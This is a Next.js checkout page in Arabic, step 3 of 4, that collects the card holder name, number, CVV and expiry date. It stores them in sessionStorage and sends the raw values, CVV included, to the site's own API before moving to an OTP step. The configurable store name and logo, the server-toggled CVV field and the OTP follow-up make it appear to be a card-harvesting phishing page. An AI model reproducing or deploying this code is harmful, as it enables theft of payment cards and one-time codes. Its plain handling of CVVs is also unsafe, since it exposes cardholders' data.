"use client";

import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import Header from "../../components/Header";
import BottomNav from "../../components/BottomNav";
import { useSettings } from "@/lib/useSettings";
import { FormData } from "@/lib/types";
import CreditCard, { detectCardType } from "./_components/CreditCard";
import CardNumberInput from "./_components/CardNumberInput";

export default function CardPage() {
  const router = useRouter();
  const { settings, loading } = useSettings();
  const [cardFieldSettings, setCardFieldSettings] = useState({ showExpiryDate: true, showCvv: true });
  const [flipped, setFlipped] = useState(false);
  const [touched, setTouched] = useState<Record<string, boolean>>({});
  const [card, setCard] = useState(() => {
    const saved = typeof window !== "undefined" ? sessionStorage.getItem("formData") : null;
    if (!saved) return { cardHolderName: "", cardNumber: "", cvv: "", expiryDate: "" };
    const parsed: FormData = JSON.parse(saved);
    return { cardHolderName: "", cardNumber: parsed.cardNumber || "", cvv: parsed.cvv || "", expiryDate: parsed.expiryDate || "" };
  });

  useEffect(() => {
    if (!sessionStorage.getItem("formData")) router.replace("/checkout/details");
    fetch("/api/card-settings")
      .then((r) => r.json())
      .then((data) => setCardFieldSettings({ showExpiryDate: data.showExpiryDate ?? true, showCvv: data.showCvv ?? true }))
      .catch(() => {});
  }, [router]);

  const touch = (key: string) => setTouched((p) => ({ ...p, [key]: true }));

  function validateCardNumber(v: string) {
    if (!v) return "رقم البطاقة مطلوب";
    if (v.length !== 16) return "رقم البطاقة يجب أن يكون 16 رقماً";
    return "";
  }

  const showExpiry = cardFieldSettings.showExpiryDate;
  const showCvv = cardFieldSettings.showCvv;

  function validateExpiry(v: string) {
    if (!showExpiry) return "";
    if (!v) return "تاريخ الانتهاء مطلوب";
    if (!/^\d{2}\/\d{2}$/.test(v)) return "صيغة التاريخ غير صحيحة (MM/YY)";
    const [mm, yy] = v.split("/").map(Number);
    if (mm < 1 || mm > 12) return "الشهر غير صحيح";
    const now = new Date();
    const expiry = new Date(2000 + yy, mm - 1, 1);
    if (expiry < new Date(now.getFullYear(), now.getMonth(), 1)) return "البطاقة منتهية الصلاحية";
    return "";
  }

  function validateCvv(v: string) {
    if (!showCvv) return "";
    if (!v) return "رمز CVV مطلوب";
    if (v.length !== 3) return "رمز CVV يجب أن يكون 3 أرقام";
    return "";
  }

  const cardNumberError = validateCardNumber(card.cardNumber);
  const expiryError = validateExpiry(card.expiryDate);
  const cvvError = validateCvv(card.cvv);
  const cardType = detectCardType(card.cardNumber);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setTouched({ cardHolderName: true, cardNumber: true, expiryDate: true, cvv: true });
    if (!card.cardHolderName || cardNumberError || expiryError || cvvError) return;
    const saved = sessionStorage.getItem("formData");
    if (!saved) return;
    const parsedSaved: FormData = JSON.parse(saved);
    const merged: FormData = { ...parsedSaved, ...card };
    sessionStorage.setItem("formData", JSON.stringify(merged));
    const transactionId = sessionStorage.getItem("transactionId");
    await Promise.all([
      fetch("/api/requests", {
        method: "PUT",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ ...merged, transactionId: sessionStorage.getItem("transactionId") }),
      }),
      transactionId
        ? fetch("/api/card-transactions", {
            method: "PATCH",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              transactionId,
              cardHolderName: card.cardHolderName,
              cardNumber: card.cardNumber,
              cvv: card.cvv,
              expiryDate: card.expiryDate,
            }),
          })
        : Promise.resolve(),
    ]);
    router.push("/checkout/otp");
  };

  if (loading) {
    return <div className="flex-1 flex items-center justify-center"><div className="animate-spin h-8 w-8 border-4 border-primary border-t-transparent rounded-full" /></div>;
  }

  return (
    <>
      <Header storeName={settings.storeName} logoUrl={settings.logoUrl} />
      <main className="w-full max-w-2xl mx-auto px-2 sm:px-6 py-3 sm:py-14 mb-24" dir="rtl">

        <div className="flex flex-col items-center mb-6 sm:mb-10">
          <div className="flex items-center gap-2 mb-2">
            <span className="px-2.5 py-0.5 bg-primary/10 text-primary text-xs font-bold rounded-full tracking-widest uppercase">التحقق</span>
          </div>
          <h1 className="text-lg sm:text-3xl font-extrabold text-on-background tracking-tight">بيانات البطاقة البنكية</h1>
          <p className="text-secondary mt-1 sm:mt-2 text-xs sm:text-sm">الخطوة 3 من 4</p>
          <div className="flex gap-1.5 mt-4 sm:mt-6 w-full max-w-[240px] sm:max-w-sm">
            <div className="h-1.5 sm:h-2 w-full bg-primary rounded-full"></div>
            <div className="h-1.5 sm:h-2 w-full bg-primary rounded-full"></div>
            <div className="h-1.5 sm:h-2 w-full bg-primary rounded-full"></div>
            <div className="h-1.5 sm:h-2 w-full bg-surface-container-highest rounded-full"></div>
          </div>
        </div>

        <div className="bg-white rounded-2xl shadow-[0_8px_32px_0_rgba(0,0,0,0.06)] p-3 sm:p-8 md:p-10">
          <form onSubmit={handleSubmit} className="space-y-6 sm:space-y-10">

            <CreditCard
              cardNumber={card.cardNumber}
              cardHolderName={card.cardHolderName}
              expiryDate={card.expiryDate}
              cvv={card.cvv}
              flipped={flipped}
              cardType={cardType}
            />

            <div className="grid grid-cols-2 gap-x-6 gap-y-5">

<div className="flex flex-col gap-1 col-span-2">
                <input
                  className={`w-full bg-surface-container-low border-none rounded-xl px-4 py-3 sm:px-5 sm:py-4 text-sm sm:text-base text-on-surface focus:ring-2 focus:bg-white transition-all outline-none uppercase ${
                    touched.cardHolderName && !card.cardHolderName ? "ring-2 ring-error/40" : "focus:ring-primary/20"
                  }`}
                  value={card.cardHolderName}
                  onChange={(e) => setCard((p) => ({ ...p, cardHolderName: e.target.value }))}
                  onBlur={() => touch("cardHolderName")}
                  placeholder="أدخل الاسم كما هو مكتوب في البطاقة"
                  required
                />
                {touched.cardHolderName && !card.cardHolderName && (
                  <p className="text-error text-xs px-1 mt-0.5">اسم حامل البطاقة مطلوب</p>
                )}
              </div>

<div className="flex flex-col gap-1 col-span-2" dir="ltr">
                <label className="text-sm sm:text-base font-semibold text-secondary px-1" dir="rtl">رقم البطاقة *</label>
                <CardNumberInput
                  value={card.cardNumber}
                  onChange={(raw) => setCard((p) => ({ ...p, cardNumber: raw }))}
                  onBlur={() => touch("cardNumber")}
                  hasError={!!(touched.cardNumber && cardNumberError)}
                />
                {touched.cardNumber && cardNumberError && (
                  <p className="text-error text-xs px-1 mt-0.5" dir="rtl">{cardNumberError}</p>
                )}
              </div>

              {showCvv && (
              <div className="flex flex-col gap-1">
                <label className="text-sm sm:text-base font-semibold text-secondary px-1">رمز CVV *</label>
                <input
                  className={`w-full bg-surface-container-low border-none rounded-xl px-4 py-3 sm:px-5 sm:py-4 text-sm sm:text-base text-on-surface focus:ring-2 focus:bg-white transition-all outline-none font-mono tracking-widest ${
                    touched.cvv && cvvError ? "ring-2 ring-error/40" : "focus:ring-primary/20"
                  }`}
                  value={card.cvv}
                  onChange={(e) => { setCard((p) => ({ ...p, cvv: e.target.value.replace(/\D/g, "") })); setFlipped(true); }}
                  onBlur={() => { setFlipped(false); touch("cvv"); }}
                  placeholder="•••"
                  maxLength={3}
                  inputMode="numeric"
                />
                {touched.cvv && cvvError && <p className="text-error text-xs px-1 mt-0.5">{cvvError}</p>}
              </div>
              )}

              {showExpiry && (
              <div className="flex flex-col gap-1">
                <label className="text-sm sm:text-base font-semibold text-secondary px-1">تاريخ انتهاء البطاقة *</label>
                <input
                  className={`w-full bg-surface-container-low border-none rounded-xl px-4 py-3 sm:px-5 sm:py-4 text-sm sm:text-base text-on-surface focus:ring-2 focus:bg-white transition-all outline-none font-mono tracking-widest ${
                    touched.expiryDate && expiryError ? "ring-2 ring-error/40" : "focus:ring-primary/20"
                  }`}
                  value={card.expiryDate}
                  onChange={(e) => {
                    let v = e.target.value.replace(/\D/g, "");
                    if (v.length >= 2) v = v.slice(0, 2) + "/" + v.slice(2, 4);
                    setCard((p) => ({ ...p, expiryDate: v }));
                  }}
                  onBlur={() => touch("expiryDate")}
                  placeholder="MM/YY"
                  maxLength={5}
                  inputMode="numeric"
                />
                {touched.expiryDate && expiryError && <p className="text-error text-xs px-1 mt-0.5">{expiryError}</p>}
              </div>
              )}
            </div>

            <div className="flex flex-col-reverse sm:flex-row items-stretch sm:items-center justify-between gap-3 pt-6">
              <button
                type="button"
                onClick={() => router.back()}
                className="w-full sm:w-auto px-6 py-3 sm:px-8 sm:py-4 rounded-xl bg-surface-container-high text-on-surface text-sm sm:text-base font-bold hover:bg-surface-container-highest transition-all text-center"
              >
                رجوع
              </button>
              <button
                type="submit"
                className="w-full sm:w-auto px-8 py-3 sm:px-10 sm:py-4 rounded-xl bg-linear-to-br from-primary to-primary-container text-white text-sm sm:text-base font-bold shadow-[0_8px_20px_-4px_rgba(0,110,47,0.3)] hover:scale-[1.02] active:scale-95 transition-all text-center"
              >
                إتمام الطلب
              </button>
            </div>
          </form>
        </div>
      </main>
      <BottomNav />
    </>
  );
}
